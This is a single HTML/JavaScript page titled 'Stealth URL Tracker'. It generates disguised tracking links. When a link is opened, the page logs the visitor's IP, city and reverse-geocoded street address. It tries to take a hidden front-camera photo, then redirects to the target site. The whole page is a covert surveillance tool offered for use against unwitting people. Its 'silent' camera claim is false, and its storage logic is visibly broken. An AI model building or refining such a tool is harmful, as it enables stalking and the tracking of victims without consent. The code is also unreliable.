<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealth URL Tracker</title>
    <style>
        :root {
            --primary: #4361ee;
            --secondary: #3f37c9;
            --danger: #f72585;
            --light: #f8f9fa;
            --dark: #212529;
            --gray: #6c757d;
            --success: #4cc9f0;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f7fa;
            color: var(--dark);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 25px;
            text-align: center;
        }
        
        .panel {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        
        .url-generator {
            background-color: var(--light);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
        }
        
        .input-group {
            display: flex;
            margin-bottom: 15px;
        }
        
        .input-group input {
            flex: 1;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        
        button {
            padding: 12px 20px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.3s;
        }
        
        button:hover {
            background-color: var(--secondary);
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background-color: var(--danger);
        }
        
        .btn-success {
            background-color: var(--success);
        }
        
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
        }
        
        th {
            background-color: var(--light);
            font-weight: 600;
        }
        
        tr:hover {
            background-color: #f8f9fa;
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 10px;
            max-width: 90%;
            max-height: 90%;
            overflow: auto;
            position: relative;
        }
        
        .close-modal {
            position: absolute;
            top: 15px;
            right: 15px;
            font-size: 24px;
            cursor: pointer;
            color: var(--gray);
        }
        
        .camera-image {
            max-width: 100%;
            max-height: 80vh;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        
        .map-iframe {
            width: 100%;
            height: 500px;
            border: none;
            border-radius: 5px;
        }
        
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .badge-success {
            background-color: #dcfce7;
            color: #166534;
        }
        
        .badge-danger {
            background-color: #fee2e2;
            color: #991b1b;
        }
        
        .hidden-elements {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
        
        @media (max-width: 768px) {
            .input-group {
                flex-direction: column;
            }
            
            .input-group input {
                margin-bottom: 10px;
            }
            
            button {
                width: 100%;
            }
            
            .controls {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Advanced URL Tracker</h1>
            <p>Stealth tracking with camera capture & geolocation</p>
        </header>
        
        <div class="panel">
            <div class="url-generator">
                <h2>Generate Tracking URL</h2>
                <div class="input-group">
                    <input type="text" id="target-url" placeholder="https://example.com">
                    <button id="generate-btn">Generate</button>
                </div>
                <div id="result" style="margin-top: 15px;"></div>
            </div>
            
            <div class="controls">
                <button id="refresh-btn">Refresh Data</button>
                <button id="export-btn" class="btn-success">Export CSV</button>
                <button id="clear-btn" class="btn-danger">Clear Data</button>
            </div>
            
            <table id="data-table">
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                        <th>Location</th>
                        <th>Device</th>
                        <th>Camera</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody></tbody>
            </table>
        </div>
    </div>

    <!-- Hidden elements for camera capture -->
    <div class="hidden-elements">
        <video id="camera-video" autoplay playsinline></video>
        <canvas id="camera-canvas"></canvas>
    </div>

    <script>
    // Configuration
    const TRACKING_PREFIX = window.location.origin + "/?track=";
    let cameraStream = null;
    
    // DOM Elements
    const videoElement = document.getElementById('camera-video');
    const canvasElement = document.getElementById('camera-canvas');
    
    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
        loadTrackingData();
        setupEventListeners();
        checkForTrackingRequest();
    });
    
    function setupEventListeners() {
        document.getElementById('generate-btn').addEventListener('click', generateTrackingUrl);
        document.getElementById('refresh-btn').addEventListener('click', loadTrackingData);
        document.getElementById('export-btn').addEventListener('click', exportData);
        document.getElementById('clear-btn').addEventListener('click', clearData);
    }
    
    function generateTrackingUrl() {
        const targetUrl = document.getElementById('target-url').value.trim();
        
        if (!targetUrl) {
            alert('Please enter a URL');
            return;
        }
        
        try {
            new URL(targetUrl);
        } catch {
            alert('Please enter a valid URL (include http:// or https://)');
            return;
        }
        
        const trackingId = 'trk_' + Math.random().toString(36).substr(2, 9);
        const trackingUrl = TRACKING_PREFIX + trackingId + "&target=" + encodeURIComponent(targetUrl);
        
        document.getElementById('result').innerHTML = `
            <div style="background: #f8f9fa; padding: 15px; border-radius: 5px;">
                <p><strong>Tracking URL:</strong></p>
                <input type="text" value="${trackingUrl}" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;" readonly>
                <button onclick="copyToClipboard()">Copy URL</button>
                <p style="margin-top: 10px; font-size: 14px; color: #666;">
                    When someone clicks this link, it will silently capture their camera (if available) and redirect to the target URL.
                </p>
            </div>
        `;
    }
    
    function copyToClipboard() {
        const input = document.querySelector('#result input');
        input.select();
        document.execCommand('copy');
        alert('URL copied to clipboard!');
    }
    
    function loadTrackingData() {
        const data = getTrackingData();
        const tbody = document.querySelector('#data-table tbody');
        
        if (data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6">No tracking data available</td></tr>';
            return;
        }
        
        tbody.innerHTML = data.map(item => `
            <tr>
                <td>${formatDate(item.timestamp)}</td>
                <td>${item.ip || 'Unknown'}</td>
                <td>
                    ${item.location ? `
                        ${item.location.city || ''}${item.location.city && item.location.country ? ', ' : ''}
                        ${item.location.country || ''}
                        ${item.location.latitude ? `<span class="badge badge-success">${item.location.latitude}, ${item.location.longitude}</span>` : ''}
                    ` : 'No location'}
                </td>
                <td>${getDeviceType(item.userAgent)}</td>
                <td>
                    ${item.cameraData ? '<span class="badge badge-success">Captured</span>' : '<span class="badge badge-danger">No capture</span>'}
                </td>
                <td>
                    ${item.cameraData ? `<button onclick="showImage('${item.cameraData}')">View Photo</button>` : ''}
                    ${item.location?.latitude ? `<button onclick="showMap(${item.location.latitude}, ${item.location.longitude})">View Map</button>` : ''}
                </td>
            </tr>
        `).join('');
    }
    
    function formatDate(timestamp) {
        return new Date(timestamp).toLocaleString();
    }
    
    function getDeviceType(userAgent) {
        if (/mobile/i.test(userAgent)) return 'Mobile';
        if (/tablet/i.test(userAgent)) return 'Tablet';
        return 'Desktop';
    }
    
    function getTrackingData() {
        return JSON.parse(localStorage.getItem('tracking_data') || []);
    }
    
    function saveTrackingData(data) {
        localStorage.setItem('tracking_data', JSON.stringify(data));
    }
    
    function exportData() {
        const data = getTrackingData();
        let csv = 'Timestamp,IP Address,City,Country,Latitude,Longitude,Device,Target URL\n';
        
        data.forEach(item => {
            csv += `"${formatDate(item.timestamp)}","${item.ip || 'Unknown'}","${item.location?.city || ''}","${item.location?.country || ''}",` +
                  `"${item.location?.latitude || ''}","${item.location?.longitude || ''}","${getDeviceType(item.userAgent)}","${item.target}"\n`;
        });
        
        const blob = new Blob([csv], { type: 'text/csv' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `tracking-data-${new Date().toISOString().split('T')[0]}.csv`;
        a.click();
    }
    
    function clearData() {
        if (confirm('Are you sure you want to delete ALL tracking data? This cannot be undone.')) {
            localStorage.removeItem('tracking_data');
            loadTrackingData();
        }
    }
    
    function showImage(imageData) {
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content">
                <span class="close-modal" onclick="this.parentElement.parentElement.remove()">&times;</span>
                <h3>Camera Capture</h3>
                <img src="${imageData}" class="camera-image" alt="Camera capture">
                <div style="margin-top: 15px;">
                    <button onclick="downloadImage('${imageData}')">Download Image</button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
    }
    
    function showMap(lat, lon) {
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content">
                <span class="close-modal" onclick="this.parentElement.parentElement.remove()">&times;</span>
                <h3>Location Map</h3>
                <iframe class="map-iframe" 
                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}">
                </iframe>
                <div style="margin-top: 15px; text-align: center;">
                    <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=16/${lat}/${lon}" target="_blank">
                        View Larger Map
                    </a>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
    }
    
    function downloadImage(imageData) {
        const link = document.createElement('a');
        link.href = imageData;
        link.download = `capture-${Date.now()}.jpg`;
        link.click();
    }
    
    async function checkForTrackingRequest() {
        const params = new URLSearchParams(window.location.search);
        const trackingId = params.get('track');
        const targetUrl = params.get('target');
        
        if (trackingId && targetUrl) {
            const decodedUrl = decodeURIComponent(targetUrl);
            
            // Prepare tracking data
            const trackingData = {
                id: trackingId,
                timestamp: new Date().toISOString(),
                target: decodedUrl,
                referrer: document.referrer || 'Direct',
                userAgent: navigator.userAgent,
                ip: 'Pending',
                cameraData: null,
                location: null
            };
            
            try {
                // Get IP and location data
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                
                trackingData.ip = ipData.ip || 'Unknown';
                
                if (ipData.latitude && ipData.longitude) {
                    trackingData.location = {
                        latitude: ipData.latitude,
                        longitude: ipData.longitude,
                        city: ipData.city,
                        country: ipData.country_name
                    };
                    
                    // Get detailed address from Nominatim
                    try {
                        const nominatimResponse = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`
                        );
                        const nominatimData = await nominatimResponse.json();
                        
                        if (nominatimData.address) {
                            trackingData.location.address = nominatimData.address;
                        }
                    } catch (e) {
                        console.error('Nominatim error:', e);
                    }
                }
                
                // Try camera capture
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    try {
                        cameraStream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user' },
                            audio: false 
                        });
                        
                        videoElement.srcObject = cameraStream;
                        await new Promise(resolve => videoElement.onloadedmetadata = resolve);
                        
                        // Wait for camera to initialize
                        await new Promise(resolve => setTimeout(resolve, 500));
                        
                        // Capture frame
                        canvasElement.width = videoElement.videoWidth;
                        canvasElement.height = videoElement.videoHeight;
                        const ctx = canvasElement.getContext('2d');
                        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                        
                        trackingData.cameraData = canvasElement.toDataURL('image/jpeg', 0.7);
                    } catch (e) {
                        console.error('Camera error:', e);
                    } finally {
                        if (cameraStream) {
                            cameraStream.getTracks().forEach(track => track.stop());
                        }
                    }
                }
            } catch (e) {
                console.error('Tracking error:', e);
            } finally {
                // Save data
                const allData = getTrackingData();
                allData.unshift(trackingData);
                saveTrackingData(allData);
                
                // Redirect to target URL
                window.location.href = decodedUrl;
            }
        }
    }
    </script>
</body>
</html>
